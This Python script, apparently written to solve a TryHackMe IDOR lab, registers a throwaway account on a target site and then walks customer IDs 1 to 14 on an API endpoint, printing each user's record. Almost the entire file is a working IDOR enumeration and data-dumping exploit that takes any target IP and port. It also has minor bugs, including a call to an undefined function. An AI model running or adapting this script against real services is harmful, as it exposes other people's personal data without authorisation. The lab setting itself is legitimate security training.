#!/usr/bin/env python3
#
# author: thomas osgood
#
# description:
#
# this program is designed to solve the final
# challenge in the IDOR room of TryHackMe. this
# will register a user, then attempt to dump the
# information of all users to STDOUT so the
# questions can be answered.
#
# execution:
#
# python3 DoorKnocker.py <targetip> <targetport>
# ./DoorKnocker <targetip> <targetport>
#
# note: the targetip is the ip address of the
# machine as presented by TryHackMe and the
# targetport is 80.
#

import argparse
import os
import platform
import random
import requests
import string
import sys

class DoorKnocker:
    def __init__(self, baseurl:str):
        success, message = validate_string_param(baseurl)
        if not(success):
            raise TypeError(message)

        if baseurl[-1] == "/":
            if len(baseurl) < 2:
                raise ValueError("invalid baseurl entered")
            baseurl = baseurl[:-1]

        self.__baseurl = baseurl
        self.__default_timeout = 10
        self.__password = str()
        self.__session = requests.Session()
        self.__username = str()
        return

    def dump_users(self) -> tuple[bool,str]:
        """
        function designed to loop through a range of
        user ids and attempt to dump the user info
        by contacting the API endpoint and passing the
        current user id as the ID param. the data is
        returned as JSON and will be printed out to
        STDOUT if no error occurs.
        """
        err_count = int()
        message = str()
        success = bool()

        try:
            targets = range(1,15)
            for i in targets:
                success, message = self.exploit_idor(i)
                if not(success):
                    err_count += 1
                    ErrMsg(message)

            if err_count == len(targets):
                raise ValueError("failed to dump any user data")
            elif err_count > 0:
                InfMsg(f"{err_count} user(s) encountered errors")

            message = "users successfully dumped"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def exploit_idor(self, tgtid:int) -> tuple[bool,str]:
        """
        function designed to contact the api/v1/customer
        endpoint in an attempt to acquire user info by
        passing in a user id. if successful, the data
        returned by the endpoint will be JSON containing
        user information.
        """
        message = str()
        params = dict()
        success = bool()
        targetroute = "api/v1/customer"
        targeturl = f"{self.__baseurl}/{targetroute}"

        try:
            if not(isinstance(tgtid,int)):
                raise TypeError(f"tgtid must be an int. got {type(tgtid)}")
            elif tgtid < 1:
                raise ValueError("tgtid must be >= 1")

            params["id"] = tgtid

            resp = self.__session.get(targeturl, params=params, timeout=self.__default_timeout)
            if resp.status_code >= 400:
                raise ValueError(f"error getting user {tgtid} ({resp.status_code} {resp.reason})")

            SucMsg(resp.json())

            message = f"customer {tgtid} info successfully dumped"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def register_user(self) -> tuple[bool,str]:
        """
        function designed to register a user on the
        target site. this will automatically generate
        a random usernam:password combination and
        contact the site to register the new user.
        if successful, the username:password combo
        will be printed to STDOUT for future use.
        """
        email = str()
        message = str()
        payload = dict()
        proxies = None
        success = bool()
        targetroute = "customers/signup"
        targeturl = f"{self.__baseurl}/{targetroute}"
        
        try:
            self.__username, success, message = GenRandomString(minlen=5, maxlen=20)
            if not(success):
                raise ValueError(f"[username gen] {message}")

            self.__password, success, message = GenRandomString(minlen=6, maxlen=20)
            if not(success):
                raise ValueError(f"[password gen] {message}")

            email = f"{self.__username}@example.local"

            payload["username"] = self.__username
            payload["email"] = email
            payload["password"] = self.__password
            payload["cpassword"] = self.__password

            resp = self.__session.post(targeturl, data=payload, timeout=self.__default_timeout, proxies=proxies)
            if resp.status_code >= 400:
                raise ValueError(f"error registering user ({resp.status_code} {resp.reason})")

            message = f"\"{self.__username}:{self.__password}\" successfully registered"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

############################################################
# Global Variables
############################################################

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

HTTPS_ENABLED = False

############################################################
# Formatting Functions
############################################################

def SucMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_GRN}[+]{ANSI_RST} {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_RED}[-]{ANSI_RST} {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}", end="")
    return

############################################################
# Validation Functions
############################################################

def port_type(portno):
    """
    function designed to make sure a port param
    is a valid network port. this can be used
    in the argparse types. if the portno passed
    in is below 1 or above 65535, an exception
    will be thrown.
    """
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

def validate_string_param(arg:str, name:str = None) -> tuple[bool,str]:
    """
    function designed to make sure a parameter
    that has been passed in is a string. this
    will utilize the isinstance() function and
    make sure the string is of non-zero length.
    """
    message = str()
    success = bool()

    try:
        if not(isinstance(name,str)):
            name = "param"

        if not(isinstance(arg,str)):
            raise TypeError(f"{name} must be a string. got {type(name)}")

        arg = arg.strip()
        if len(arg) < 1:
            raise ValueError(f"{name} must be a non-zero length string")

        message = f"{name} is a valid string input"
        success = True
    except Exception as ex:
        message = str(ex)
        success = False

    return (success, message)

############################################################

def GenRandomString(minlen = None, maxlen = None):
    message = str()
    randstring = str()
    success = bool()

    try:
        alphabet = f"{string.ascii_lowercase}{string.ascii_uppercase}{string.digits}"

        ############################################################
        # Validate minlen value
        ############################################################
        if minlen is None:
            minlen = 8
        elif not(isinstance(minlen,int)):
            raise TypeError("Minlen must be int. Got {type(minlen)}")
        elif minlen < 1:
            raise ValueError("Minlen must be greater than 0")

        ############################################################
        # Validate maxlen value
        ############################################################
        if maxlen is None:
            maxlen = 15
        elif not(isinstance(maxlen,int)):
            raise TypeError("Minlen must be int. Got {type(maxlen)}")
        elif maxlen < 1:
            raise ValueError("Minlen must be greater than 0")

        ############################################################
        # Make sure minlen <= maxlen
        ############################################################
        if minlen > maxlen:
            tmp = maxlen
            maxlen = minlen
            minlen = tmp

        ############################################################
        # Choose length of string
        ############################################################
        stringlen = random.randrange(minlen, maxlen)

        ############################################################
        # Build random string
        ############################################################
        for i in range(stringlen):
            curchoice = random.choice(alphabet)
            randstring = f"{randstring}{curchoice}"

        message = "random string generated"
        success = True
    except Exception as ex:
        message = str(ex)
        randstring = ""
        success = False
    return (randstring, success, message)

def main():
    scheme = str()

    if platform.system().lower() == "windows":
        os.system("")
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)
    parser.add_argument("port", help="Port to connect to target on.", type=port_type)

    parser.add_argument("--secure", help="use HTTPS scheme", action="store_true", dest="secure")

    args = parser.parse_args()

    target = args.target
    port = args.port
    secure = args.secure

    ############################################################
    # Set HTTP scheme (HTTP or HTTPS) based on arguments.
    ############################################################
    if secure:
        scheme = "https"
    else:
        scheme = "http"

    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'Target Information':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Target Port: {port}")
    InfoMsg(f"Scheme: {scheme}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

    baseurl = f"{scheme}://{target}:{port}"

    try:
        knock = DoorKnocker(baseurl)

        success, message = knock.register_user()
        if not(success):
            raise ValueError(message)
        SucMsg(message)

        print(f"{ANSI_RED}{'-'*60}{ANSI_RST}")

        success, message = knock.dump_users()
        if not(success):
            raise ValueError(message)
        print(f"{ANSI_RED}{'-'*60}{ANSI_RST}")
        SucMsg(message)
    except Exception as ex:
        print(f"{ANSI_RED}{'-'*60}{ANSI_RST}")
        ErrMsg(str(ex))
        sys.exit(str(ex))

    return

if __name__ == "__main__":
    main()


